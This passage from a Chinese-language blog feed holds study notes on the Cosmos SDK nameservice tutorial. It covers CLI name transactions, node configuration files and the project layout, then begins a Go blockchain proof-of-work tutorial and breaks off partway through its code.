<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检查资金余额</span></span><br><span class="line">cosmos-nameservicecli query account $(cosmos-nameservicecli keys show jack -a)</span><br><span class="line">cosmos-nameservicecli query account $(cosmos-nameservicecli keys show alice -a)</span><br></pre></td></tr></table></figure>
<h2 id="购买域名">购买域名:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># jack 花费 20nametoken 购买 namechain.com</span></span><br><span class="line">cosmos-nameservicecli tx cosmosnameservice buy-name namechain.com 20nametoken --from jack</span><br><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameservicecli tx cosmosnameservice buy-name namechain.com 20nametoken --from jack</span></span><br><span class="line">Enter keyring passphrase:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;chain_id&quot;</span>: <span class="string">&quot;namechain&quot;</span>,</span><br><span class="line">  <span class="string">&quot;account_number&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">  <span class="string">&quot;sequence&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;fee&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;gas&quot;</span>: <span class="string">&quot;200000&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;msgs&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cosmosnameservice/BuyName&quot;</span>,</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;namechain.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bid&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">&quot;denom&quot;</span>: <span class="string">&quot;nametoken&quot;</span>,</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;20&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;buyer&quot;</span>: <span class="string">&quot;cosmos1vwp2kpjyg7g2x8pd320rugw0m7ut8q3ha9m7u4&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;memo&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">confirm transaction before signing and broadcasting [y/N]: y</span><br><span class="line">Enter keyring passphrase:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;height&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;txhash&quot;</span>: <span class="string">&quot;5B8C36D6DCF7334255BD8E974D095389D7BC75577024408F4BB7396B607A84F1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;raw_log&quot;</span>: <span class="string">&quot;[]&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="设置域名解析">设置域名解析:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置域名的解析值</span></span><br><span class="line"><span class="comment"># jack 发起一笔交易，给 namechain 设置 DNS 解析为 8.8.8.8</span></span><br><span class="line"><span class="comment"># 注意官方写反了!</span></span><br><span class="line">cosmos-nameservicecli tx cosmosnameservice set-name 8.8.8.8 namechain.com  --from jack</span><br><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameservicecli tx cosmosnameservice set-name 8.8.8.8 namechain.com --from jack</span></span><br><span class="line">Enter keyring passphrase:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;chain_id&quot;</span>: <span class="string">&quot;namechain&quot;</span>,</span><br><span class="line">  <span class="string">&quot;account_number&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">  <span class="string">&quot;sequence&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">  <span class="string">&quot;fee&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;gas&quot;</span>: <span class="string">&quot;200000&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;msgs&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cosmosnameservice/SetName&quot;</span>,</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;namechain.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;8.8.8.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;owner&quot;</span>: <span class="string">&quot;cosmos1vwp2kpjyg7g2x8pd320rugw0m7ut8q3ha9m7u4&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;memo&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">confirm transaction before signing and broadcasting [y/N]: y</span><br><span class="line">Enter keyring passphrase:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;height&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;txhash&quot;</span>: <span class="string">&quot;B9D2D889371BD86AFCCF5C36A2F3143B0FCCF56A7B0B4BDF247301ABBBFA893B&quot;</span>,</span><br><span class="line">  <span class="string">&quot;raw_log&quot;</span>: <span class="string">&quot;[]&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="查询域名解析">查询域名解析:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 针对您注册的名称尝试一个resolve查询</span></span><br><span class="line"><span class="comment"># 查询 namechain.com 的信息</span></span><br><span class="line">cosmos-nameservicecli query cosmosnameservice resolve namechain.com</span><br><span class="line"></span><br><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameservicecli query cosmosnameservice resolve namechain.com</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;value&quot;</span>: <span class="string">&quot;8.8.8.8&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="whois查询">whois查询:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># whois查询</span></span><br><span class="line">cosmos-nameservicecli query cosmosnameservice get-whois namechain.com</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameservicecli query cosmosnameservice get-whois namechain.com</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;creator&quot;</span>: <span class="string">&quot;cosmos1vwp2kpjyg7g2x8pd320rugw0m7ut8q3ha9m7u4&quot;</span>,</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;value&quot;</span>: <span class="string">&quot;8.8.8.8&quot;</span>,</span><br><span class="line">  <span class="string">&quot;price&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;denom&quot;</span>: <span class="string">&quot;nametoken&quot;</span>,</span><br><span class="line">      <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;20&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="购买他人的域名">购买他人的域名:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># alice买jack的域名</span></span><br><span class="line">cosmos-nameservicecli tx cosmosnameservice buy-name namechain.com 20nametoken --from alice</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameservicecli tx cosmosnameservice buy-name namechain.com 20nametoken --from alice</span></span><br><span class="line">Enter keyring passphrase:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;chain_id&quot;</span>: <span class="string">&quot;namechain&quot;</span>,</span><br><span class="line">  <span class="string">&quot;account_number&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">  <span class="string">&quot;sequence&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;fee&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;gas&quot;</span>: <span class="string">&quot;200000&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;msgs&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cosmosnameservice/BuyName&quot;</span>,</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;namechain.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bid&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">&quot;denom&quot;</span>: <span class="string">&quot;nametoken&quot;</span>,</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;20&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;buyer&quot;</span>: <span class="string">&quot;cosmos192t6nfdqa9z6n3j8djpyupdzjfdwq6mr9v87vw&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;memo&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">confirm transaction before signing and broadcasting [y/N]: y</span><br><span class="line">Enter keyring passphrase:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;height&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;txhash&quot;</span>: <span class="string">&quot;F27BB0F6BA6D861B8C8B6FE48F54CC4D2869E313A8F630B0116C8A227C648A61&quot;</span>,</span><br><span class="line">  <span class="string">&quot;raw_log&quot;</span>: <span class="string">&quot;[]&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询域名拥有者</span></span><br><span class="line">cosmos-nameservicecli query cosmosnameservice get-whois namechain.com</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameservicecli query cosmosnameservice get-whois namechain.com</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;creator&quot;</span>: <span class="string">&quot;cosmos192t6nfdqa9z6n3j8djpyupdzjfdwq6mr9v87vw&quot;</span>,</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;value&quot;</span>: <span class="string">&quot;8.8.8.8&quot;</span>,</span><br><span class="line">  <span class="string">&quot;price&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;denom&quot;</span>: <span class="string">&quot;nametoken&quot;</span>,</span><br><span class="line">      <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;20&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>creator已由<code>cosmos1vwp2kpjyg7g2x8pd320rugw0m7ut8q3ha9m7u4</code> jack变更为<code>cosmos192t6nfdqa9z6n3j8djpyupdzjfdwq6mr9v87vw</code> alice</p>
<h2 id="删除域名">删除域名:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># alice删除域名</span></span><br><span class="line">cosmos-nameservicecli tx cosmosnameservice delete-name namechain.com --from alice</span><br><span class="line"></span><br><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameservicecli tx cosmosnameservice delete-name namechain.com --from alice</span></span><br><span class="line">Enter keyring passphrase:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;chain_id&quot;</span>: <span class="string">&quot;namechain&quot;</span>,</span><br><span class="line">  <span class="string">&quot;account_number&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">  <span class="string">&quot;sequence&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;fee&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;gas&quot;</span>: <span class="string">&quot;200000&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;msgs&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cosmosnameservice/DeleteName&quot;</span>,</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;namechain.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;creator&quot;</span>: <span class="string">&quot;cosmos192t6nfdqa9z6n3j8djpyupdzjfdwq6mr9v87vw&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;memo&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">confirm transaction before signing and broadcasting [y/N]: y</span><br><span class="line">Enter keyring passphrase:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;height&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;txhash&quot;</span>: <span class="string">&quot;D168567D166238B1D11B494BFE13CAC317A72E7D0C296EAAB3F96B817159D156&quot;</span>,</span><br><span class="line">  <span class="string">&quot;raw_log&quot;</span>: <span class="string">&quot;[]&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询域名拥有者</span></span><br><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameservicecli query cosmosnameservice get-whois namechain.com</span></span><br><span class="line">could not resolve whois namechain.com</span><br><span class="line">internal</span><br></pre></td></tr></table></figure>
<h2 id="列出所有域名">列出所有域名:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出所有的nameservice域名</span></span><br><span class="line">cosmos-nameservicecli query cosmosnameservice list-whois</span><br></pre></td></tr></table></figure>
<blockquote>
<p>恭喜，您已经构建了一个Cosmos SDK应用程序！本教程现已完成。接下来是要查看如何使用REST服务器运行相同的命令.</p>
</blockquote>
<blockquote>
<p>rest部分没测,先略过。</p>
</blockquote>
<h1>初始化的配置文件:</h1>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cosmos-nameserviced init &lt;moniker&gt; --chain-id=namechain</span><br></pre></td></tr></table></figure>
<p>初始化配置文件和创世文件,默认目录<code>/root/.nameserviced/config/</code><br />
生成文件结构如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">├── config</span><br><span class="line">│   ├── app.<span class="property">toml</span></span><br><span class="line">│   ├── config.<span class="property">toml</span></span><br><span class="line">│   ├── genesis.<span class="property">json</span></span><br><span class="line">│   ├── node_key.<span class="property">json</span></span><br><span class="line">│   └── priv_validator_key.<span class="property">json</span></span><br><span class="line">└── data</span><br><span class="line">    └── priv_validator_state.<span class="property">json</span></span><br></pre></td></tr></table></figure>
<h2 id="app-toml">app.toml:</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 最小交易gas费用</span></span><br><span class="line">minimum-gas-prices = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># state 存储策略</span></span><br><span class="line">pruning = <span class="string">&quot;default&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># These are applied if and only if the pruning strategy is custom.</span></span><br><span class="line">pruning-keep-recent = <span class="string">&quot;0&quot;</span></span><br><span class="line">pruning-keep-every = <span class="string">&quot;0&quot;</span></span><br><span class="line">pruning-interval = <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂停的区块高度，用于升级（升级高度）或测试:</span></span><br><span class="line">halt-height = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂停的区块时间，到达该时间时暂停出块，用于升级或测试:</span></span><br><span class="line">halt-time = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用 inter-block cache:</span></span><br><span class="line">inter-block-cache = true</span><br></pre></td></tr></table></figure>
<h2 id="config-toml">config.toml:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ABCI socket 地址:</span></span><br><span class="line">proxy_app = <span class="string">&quot;tcp://127.0.0.1:26658&quot;</span></span><br><span class="line"><span class="comment"># 节点名称:</span></span><br><span class="line">moniker = <span class="string">&quot;moniker&quot;</span></span><br><span class="line"><span class="comment"># 快速同步，允许并发下载区块，同时验证commit</span></span><br><span class="line">fast_sync = <span class="literal">true</span></span><br><span class="line"><span class="comment"># 数据库 (goleveldb | cleveldb | boltdb | rocksdb)</span></span><br><span class="line">db_backend = <span class="string">&quot;goleveldb&quot;</span></span><br><span class="line"><span class="comment"># 数据库存放位置</span></span><br><span class="line">db_dir = <span class="string">&quot;data&quot;</span></span><br><span class="line"><span class="comment"># 日志输出</span></span><br><span class="line">log_level = <span class="string">&quot;main:info,state:info,*:error&quot;</span></span><br><span class="line"><span class="comment"># 日志格式化</span></span><br><span class="line">log_format = <span class="string">&quot;plain&quot;</span></span><br><span class="line"><span class="comment"># 创世文件位置，包含 初始 validator 集合和其他元数据</span></span><br><span class="line">genesis_file = <span class="string">&quot;config/genesis.json&quot;</span></span><br><span class="line"><span class="comment"># validator 私钥文件</span></span><br><span class="line">priv_validator_key_file = <span class="string">&quot;config/priv_validator_key.json&quot;</span></span><br><span class="line"><span class="comment"># 存放 validator 最后的签名状态</span></span><br><span class="line">priv_validator_state_file = <span class="string">&quot;data/priv_validator_state.json&quot;</span></span><br><span class="line"><span class="comment"># Tendermint 监听来自外部 validator 连接进程的地址</span></span><br><span class="line">priv_validator_laddr = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 在 P2P 中进行节点验证的私钥</span></span><br><span class="line">node_key_file = <span class="string">&quot;config/node_key.json&quot;</span></span><br><span class="line"><span class="comment"># abci 连接机制 (socket | grpc)</span></span><br><span class="line">abci = <span class="string">&quot;socket&quot;</span></span><br><span class="line"><span class="comment"># profiling server 监听地址</span></span><br><span class="line">prof_laddr = <span class="string">&quot;localhost:6060&quot;</span></span><br><span class="line"><span class="comment"># 连接新节点时，是否查询 ABCI 应用</span></span><br><span class="line">filter_peers = <span class="literal">false</span></span><br><span class="line"><span class="comment"># RPC server 监听地址</span></span><br><span class="line">laddr = <span class="string">&quot;tcp://127.0.0.1:26657&quot;</span></span><br><span class="line"><span class="comment"># 允许的跨域请求 origins</span></span><br><span class="line">cors_allowed_origins = []</span><br><span class="line"><span class="comment"># 允许的跨域请求方法</span></span><br><span class="line">cors_allowed_methods = [<span class="string">&quot;HEAD&quot;</span>, <span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, ]</span><br><span class="line"><span class="comment"># 跨域请求中允许携带的请求头</span></span><br><span class="line">cors_allowed_headers = [<span class="string">&quot;Origin&quot;</span>, <span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>, <span class="string">&quot;X-Server-Time&quot;</span>, ]</span><br><span class="line"><span class="comment"># grpc 监听地址</span></span><br><span class="line">grpc_laddr = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># grpc 最大并发连接数</span></span><br><span class="line">grpc_max_open_connections = 900</span><br><span class="line"><span class="comment"># 是否允许非安全 RPC 命令</span></span><br><span class="line">unsafe=<span class="literal">false</span></span><br><span class="line"><span class="comment"># 最大并发连接数</span></span><br><span class="line">max_open_connections = 900</span><br></pre></td></tr></table></figure>
<h1>项目目录:</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">├── app</span><br><span class="line">│   ├── app.<span class="property">go</span></span><br><span class="line">│   ├── <span class="keyword">export</span>.<span class="property">go</span></span><br><span class="line">│   └── prefix.<span class="property">go</span></span><br><span class="line">├── cmd</span><br><span class="line">│   ├── cosmos-nameservicecli</span><br><span class="line">│   │   └── main.<span class="property">go</span></span><br><span class="line">│   └── cosmos-nameserviced</span><br><span class="line">│       ├── genaccounts.<span class="property">go</span></span><br><span class="line">│       └── main.<span class="property">go</span></span><br><span class="line">├── config.<span class="property">yml</span></span><br><span class="line">├── go.<span class="property">mod</span></span><br><span class="line">├── go.<span class="property">sum</span></span><br><span class="line">├── <span class="title class_">Makefile</span></span><br><span class="line">├── readme.<span class="property">md</span></span><br><span class="line">├── vue <span class="comment">// </span></span><br><span class="line">└── x</span><br><span class="line">    └── cosmosnameservice</span><br><span class="line">        ├── abci.<span class="property">go</span> <span class="comment">// 实现在BeginBlock()和EndBlock()中需要触发的逻辑</span></span><br><span class="line">        ├── client  <span class="comment">// 本模块支持的 命令行方法和REST方法</span></span><br><span class="line">        │   ├── cli</span><br><span class="line">        │   │   ├── query.<span class="property">go</span> <span class="comment">// 从命令行构建本模块支持的 查询请求</span></span><br><span class="line">        │   │   ├── queryWhois.<span class="property">go</span></span><br><span class="line">        │   │   ├── tx.<span class="property">go</span> <span class="comment">// 从命令行构建本模块支持的 交易请求</span></span><br><span class="line">        │   │   └── txWhois.<span class="property">go</span></span><br><span class="line">        │   └── rest</span><br><span class="line">        │       ├── queryWhois.<span class="property">go</span> <span class="comment">// 本模块支持的REST查询请求</span></span><br><span class="line">        │       ├── rest.<span class="property">go</span></span><br><span class="line">        │       └── txWhois.<span class="property">go</span> <span class="comment">// 本模块支持的REST交易</span></span><br><span class="line">        ├── genesis.<span class="property">go</span> <span class="comment">// 导入模块的初始状态以及导出模块的状态</span></span><br><span class="line">        ├── handler.<span class="property">go</span> <span class="comment">// 处理本模块支持的所有类型的消息</span></span><br><span class="line">        ├── handlerMsgBuyName.<span class="property">go</span></span><br><span class="line">        ├── handlerMsgDeleteName.<span class="property">go</span></span><br><span class="line">        ├── handlerMsgSetName.<span class="property">go</span></span><br><span class="line">        ├── keeper <span class="comment">// 本模块的子存储空间的读写功能</span></span><br><span class="line">        │   ├── keeper.<span class="property">go</span></span><br><span class="line">        │   ├── params.<span class="property">go</span></span><br><span class="line">        │   ├── querier.<span class="property">go</span> <span class="comment">// 本模块的子存储空间的查询</span></span><br><span class="line">        │   └── whois.<span class="property">go</span></span><br><span class="line">        ├── <span class="variable language_">module</span>.<span class="property">go</span> <span class="comment">// 实现APPModule接口</span></span><br><span class="line">        ├── spec  <span class="comment">// 模块的规范性说明文档</span></span><br><span class="line">        │   └── <span class="variable constant_">README</span>.<span class="property">md</span></span><br><span class="line">        └── types</span><br><span class="line">            ├── codec.<span class="property">go</span> <span class="comment">// 使用Amino进行序列化的数据类型</span></span><br><span class="line">            ├── errors.<span class="property">go</span> <span class="comment">// 模块执行过程中可能产生的错误</span></span><br><span class="line">            ├── events.<span class="property">go</span> <span class="comment">// 本模块在处理交易或请求时要推送的事件类型</span></span><br><span class="line">            ├── expected_keepers.<span class="property">go</span> <span class="comment">// 本模块以来的其他模块的接口</span></span><br><span class="line">            ├── genesis.<span class="property">go</span> <span class="comment">// 本模块初始化时的相关类型和默认的初始状态</span></span><br><span class="line">            ├── key.<span class="property">go</span> <span class="comment">// 本模块的子存储空间读写时对应的键</span></span><br><span class="line">            ├── <span class="title class_">MsgBuyName</span>.<span class="property">go</span></span><br><span class="line">            ├── <span class="title class_">MsgCreateWhois</span>.<span class="property">go</span></span><br><span class="line">            ├── <span class="title class_">MsgDeleteName</span>.<span class="property">go</span></span><br><span class="line">            ├── <span class="title class_">MsgDeleteWhois</span>.<span class="property">go</span></span><br><span class="line">            ├── msg.<span class="property">go</span> <span class="comment">// 本模块负责处理的消息</span></span><br><span class="line">            ├── <span class="title class_">MsgSetName</span>.<span class="property">go</span></span><br><span class="line">            ├── <span class="title class_">MsgSetWhois</span>.<span class="property">go</span></span><br><span class="line">            ├── params.<span class="property">go</span> <span class="comment">// 本模块的参数配置</span></span><br><span class="line">            ├── querier.<span class="property">go</span> <span class="comment">// 本模块负责处理的查询请求相关类型的定义</span></span><br><span class="line">            ├── types.<span class="property">go</span></span><br><span class="line">            └── <span class="title class_">TypeWhois</span>.<span class="property">go</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/weixin_43988498/article/details/114996094">cosmos官方nameservice测试项目详解（代码注释+官方文档错误纠正）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/docs/cosmos/tutorial/06-set-name.html#msg">Cosmos SDK 中文文档</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/547fc70b8335">cosmos-sdk-tutorials namechain 体验过程解析</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/cosmos/gravity-bridge/issues/320">panic: crypto/hmac: hash generation function does not produce unique values when using ebdcli keys to add accoun</a> 降级go1.18-&gt;go1.15.15</p>
</li>
<li class="lvl-2">
<p><a href="https://ldmf.net/archives/78.html">CentOS7 安装 Go 1.18</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/yaoqingzhuan/p/10889718.html">linux添加环境变量</a></p>
</li>
<li class="lvl-2">
<p><a href="https://tutorials.cosmos.network/academy/2-main-concepts/architecture.html">Cosmos开发者门户-宇宙学院-区块链应用架构</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-GoBlockchain_Tutorial_Part2_ProofOfWork</title>
    <url>/2022/57333.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://www.krad.top/goblockchain02/">Go Blockchain Tutorial Part 2: Proof of Work</a> 学习记录</p>
<h1>共识机制:</h1>
<p>我们常说区块链是一个分布式系统，<strong>系统中每个节点都有机会储存数据信息构造一个区块然后追加到区块链尾部</strong>。<br />
这里就存在一个问题，</p>
<blockquote>
<p>那就是当区块链系统中有多个节点都想将自己的区块追加到区块链时，我们该怎么办？</p>
</blockquote>
<p>我们将这些等待添加的区块统称为<code>候选区块</code>，显然我们不能对<code>候选区块</code>全盘照收，否则区块链就不再是一条链而是不同分叉成区块树。</p>
<blockquote>
<p>那么我们如何确定一种方法来从<code>候选区块</code>中选择一个加入到区块链中了？</p>
</blockquote>
<p>这里就需要用到区块链的<code>共识机制</code>，后文将以比特币使用的最经典<code>PoW共识机制</code>进行讲解。</p>
<p>共识机制说的通俗明白一点就是要在相对公平的条件下让想要添加区块进区块链的节点内卷，通过<code>竞争</code>选择出一个大家公认的节点添加它的区块进入区块链。<br />
整个共识机制被分为两部分，首先是<code>竞争</code>，然后是<code>共识</code>。</p>
<p>中本聪在比特币中设计了如下的一个Game来实现竞争：每个节点去寻找一个随机值（也就是<code>nonce</code>），将这个随机值作为候选区块的头部信息属性之一，要求候选区块对自身信息（注意这里是包含了<code>nonce</code>的）进行哈希后表示为数值要小于一个难度目标值（也就是Target），最先寻找到<code>nonce</code>的节点即为卷王，可以将自己的候选区块发布并添加到区块链尾部。<br />
这个Game设计的非常巧妙</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>首先每个节点要寻找到的<code>nonce</code>只对自己<code>候选区块</code>有效，防止了其它节点同学抄答案</p>
</li>
<li class="lvl-2">
<p>其次，<strong>nonce的寻找是完全随机的没有技巧</strong>，寻找到<code>nonce</code>的时间与目标难度值与节点本身计算性能有关，但不妨碍性能较差的节点也有机会获胜；</p>
</li>
<li class="lvl-2">
<p>最后寻找<code>nonce</code>可能耗费大量时间与资源，但是验证卷王是否真的找到了nonce却非常却能够很快完成并几乎不需要耗费资源，这个寻找到的nonce可以说就是卷王真的是卷王的证据。</p>
</li>
</ul>
<p>现在我们就来实现这个Game。<br />
Find Nonce Game~</p>
<h2 id="代码实现：">代码实现：</h2>
<figure class="highlight go"><figcaption><span>proofofwork.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> blockchain</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">	<span class="string">&quot;math/big&quot;</span></span><br><span class="line">	<span class="string">&quot;my-blockchain/constcoe&quot;</span></span><br><span class="line">	<span class="string">&quot;my-blockchain/utils&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回目标难度值的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> GetTarget() []<span class="type">byte</span> &#123;</span><br><span class="line">	target := big.NewInt(<span class="number">1</span>)</span><br><span class="line">	